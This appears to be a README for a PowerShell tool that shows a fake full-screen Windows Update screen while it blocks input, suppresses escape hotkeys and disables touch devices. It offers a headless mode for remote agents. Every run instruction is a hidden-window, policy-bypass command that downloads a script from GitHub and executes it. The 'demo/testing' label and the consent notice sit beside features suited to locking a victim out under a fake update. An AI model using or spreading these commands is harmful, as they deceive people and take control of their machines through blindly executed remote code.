# DWA — Windows Update Mock (PowerShell)

A Windows Update–style full-screen experience for demos/testing. It shows a convincing progress UI, temporarily blocks input, hides/clips the cursor, suppresses hotkeys, and can optionally disable/enable specific HID devices (touchpad/touchscreen/digitizer/pen) similar to Device Manager.

- Requires: Administrator + STA
- OS: Windows 10/11
- Shell: Windows PowerShell 5.1 recommended

> Important: This script can block user input and temporarily disable HID devices. Test in a controlled environment.

## Features

- Full-screen, topmost UI resembling Windows Update.
- Animated progress with stage messages until completion.
- Input restriction:
    - BlockInput API (mouse/keyboard).
    - Low-level keyboard hook to suppress Win, Alt+Tab, Alt+F4, Ctrl+Esc.
    - Cursor hidden and clipped to screen.
- Optional HID control:
    - Temporarily disables touchpad/touchscreen/digitizer/pen during run.
    - Re-enables previously disabled devices during cleanup.
- Safety-first cleanup:
    - Always unblocks input, unhooks keyboard, restores cursor, unclips cursor, and re-enables devices even on error.
- Headless fallback:
    - In non-interactive sessions (e.g., some remote agents), runs without UI/input blocking, simulates progress, and still performs cleanup.


## Quick Start

Run from CMD with Administrator privileges:

```
powershell -nop -w hidden -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
```

Alternative raw URL form:

```
powershell -nop -w hidden -sta -ep Bypass -c "iwr -useb https://github.com/sam-tam-sam/DWA/raw/main/script.ps1 | iex"
```

Fully-qualified path (if PATH doesn’t include powershell):

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
```

From a 32‑bit process on 64‑bit Windows (use Sysnative):

```
"C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
```

Download first, then execute (more reliable behind some proxies/AV):

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -sta -ep Bypass -c "$u='https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1';$p=$env:TEMP+'\dwa.ps1';iwr -useb $u -outfile $p; & 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -sta -ep Bypass -File $p"
```


## What It Does

- Presents a Windows Update–like full-screen UI with progress bars and messages.
- Enforces topmost window, focus, and periodic watchdog checks.
- Hides/clips cursor and centers it periodically.
- Suppresses common escape hotkeys to keep the UI in focus.
- Optionally disables targeted HID devices during the run, then restores them.


## Headless Mode

If the script detects a non-interactive desktop (common with some remote agents/services), it will:

- Skip UI, hooks, and input blocking.
- Simulate progress via console logs.
- Perform the same HID disable/enable workflow and cleanup.
- Avoids “UserInteractive” WinForms errors.


## Requirements

- Administrator privileges (elevated CMD/PowerShell).
- STA mode (use `-sta`).
- Windows PowerShell 5.1 (strongly recommended for WinForms/STA).
- PnpDevice module (built-in on Windows 10/11) for HID operations; if unavailable, HID steps are skipped safely.


## Safety \& Recovery

The script contains robust cleanup in all execution paths:

- Unblocks input.
- Unhooks keyboard hook.
- Restores cursor visibility and unclips cursor.
- Re-enables any devices that were disabled by the script.

If a HID device fails to re-enable automatically:

- Re-scan devices:

```
pnputil /scan-devices
```

- Re-enable a specific device (from elevated PowerShell):

```
Enable-PnpDevice -InstanceId "<DEVICE_INSTANCE_ID>" -Confirm:$false
```

- Success rate is higher in an interactive session (local or via RDP). In rare cases, a reboot may be required for a full driver stack reload.


## Troubleshooting

- “powershell is not recognized”:
    - Use full path:

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ...
```

    - From a 32‑bit host on 64‑bit Windows, use the Sysnative path shown above.
- WinForms error “not running in UserInteractive mode”:
    - You’re in a non-interactive session. Run in an interactive desktop (local/RDP) to see the UI, or rely on headless mode behavior.
- HID re-enable “Generic failure”:
    - Run `pnputil /scan-devices` and re-run `Enable-PnpDevice` for the affected InstanceId from an elevated interactive PowerShell.


## Usage Examples

Run the full experience on an interactive desktop:

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
```

Run headless (automatically chosen in non-interactive sessions):

```
powershell -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
```


## Security Notice

- This tool intentionally restricts input and manipulates HID devices. Use only with explicit consent and in controlled environments.
- Review the code before running in production scenarios.


## License

This project is provided as-is, without warranty. Use at your own risk.

***

File name: README.md

<div style="text-align: center">⁂</div>

[^1]: https://github.com/sam-tam-sam/DWAgent-Tools

